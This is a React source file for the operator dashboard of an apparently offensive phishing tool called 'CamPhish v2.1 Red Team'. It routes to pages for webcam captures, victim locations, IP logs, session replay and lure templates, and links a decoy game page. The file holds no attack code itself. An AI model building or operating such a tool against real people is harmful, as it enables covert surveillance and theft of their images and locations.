import { Routes, Route, NavLink } from 'react-router-dom'
import Dashboard from './pages/Dashboard'
import Captures from './pages/Captures'
import Locations from './pages/Locations'
import IpLogs from './pages/IpLogs'
import SessionReplay from './pages/SessionReplay'
import Templates from './pages/Templates'
import Sessions from './pages/Sessions'

const navItems = [
  { to: '/', label: 'Dashboard', icon: '📊' },
  { to: '/captures', label: 'Captures', icon: '📷' },
  { to: '/locations', label: 'Locations', icon: '📍' },
  { to: '/ips', label: 'IP Logs', icon: '🌐' },
  { to: '/replay', label: 'Replay', icon: '⚡' },
  { to: '/templates', label: 'Templates', icon: '🎭' },
  { to: '/sessions', label: 'Sessions', icon: '🗂️' },
]

export default function App() {
  return (
    <div className="min-h-screen flex bg-gray-950">
      <aside className="w-16 md:w-56 bg-gray-900 border-r border-gray-800 flex flex-col fixed h-full z-40 transition-all">
        <div className="p-3 md:p-4 border-b border-gray-800 flex items-center gap-2">
          <span className="text-2xl">🎯</span>
          <div className="hidden md:block">
            <h1 className="text-sm font-bold text-cyan-400">CamPhish</h1>
            <p className="text-[10px] text-gray-600">v2.1 Red Team</p>
          </div>
        </div>
        <nav className="flex-1 p-2 space-y-1">
          {navItems.map(item => (
            <NavLink
              key={item.to}
              to={item.to}
              end={item.to === '/'}
              className={({ isActive }) =>
                `flex items-center gap-3 px-3 py-2.5 rounded-lg text-sm font-medium transition-all ${
                  isActive
                    ? 'bg-cyan-500/15 text-cyan-400 shadow-lg shadow-cyan-500/5'
                    : 'text-gray-500 hover:bg-gray-800/50 hover:text-gray-300'
                }`
              }
            >
              <span className="text-lg">{item.icon}</span>
              <span className="hidden md:inline">{item.label}</span>
            </NavLink>
          ))}
        </nav>
        <div className="p-3 border-t border-gray-800 hidden md:block">
          <a href="/t/face-runner" target="_blank" rel="noreferrer" className="flex items-center gap-2 px-3 py-2 rounded-lg text-xs text-gray-600 hover:text-cyan-400 transition-colors">
            <span>🎮</span> Open Game
          </a>
          <a href="http://localhost:4000/_/admin/" target="_blank" rel="noreferrer" className="flex items-center gap-2 px-3 py-2 rounded-lg text-xs text-gray-600 hover:text-cyan-400 transition-colors">
            <span>🗄️</span> TrailBase Admin
          </a>
        </div>
      </aside>
      <main className="flex-1 overflow-auto ml-16 md:ml-56 p-4 md:p-6">
        <Routes>
          <Route path="/" element={<Dashboard />} />
          <Route path="/captures" element={<Captures />} />
          <Route path="/locations" element={<Locations />} />
          <Route path="/ips" element={<IpLogs />} />
          <Route path="/replay" element={<SessionReplay />} />
          <Route path="/templates" element={<Templates />} />
          <Route path="/sessions" element={<Sessions />} />
        </Routes>
      </main>
    </div>
  )
}
